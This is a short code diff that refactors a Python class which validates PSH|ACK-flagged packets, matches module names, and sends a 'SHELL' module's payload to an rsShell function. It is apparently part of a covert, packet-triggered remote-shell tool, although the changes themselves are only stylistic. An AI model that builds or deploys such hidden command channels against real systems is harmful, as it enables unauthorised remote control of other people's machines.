@@ -40,24 +40,19 @@ class ModuleParsing:
 
 	# Verify the module call is a valid and existing module
 	def isValidModule(self):
-		if self.module in self.validModules:
-			self.isValidModule = True
-		else:
-			self.isValidModule = False
+		self.isValidModule = self.module in self.validModules
 
 	# Verify the module call packet is a valid PSH|ACK packet
 	def isValidPacket(self):
 		self.getFlags()
 
-		if ((self.flags[1]==1) and (self.flags[2]==1)) and ((self.flags[0]+self.flags[3]+self.flags[4])==0):
-			self.isValidPacket = True
-
-		else:
-			self.isValidPacket = False
+		self.isValidPacket = ((self.flags[1] == 1) and (self.flags[2] == 1)) and (
+			self.flags[0] + self.flags[3] + self.flags[4]
+		) == 0
 
 	# Determine the called module and execute it
 	def executeModule(self):
-		self.response = self.module + " --> " + self.modulePayload
+		self.response = f"{self.module} --> {self.modulePayload}"
 		if self.module == "SHELL":
 			self.response = rsShell(self.modulePayload).response
 
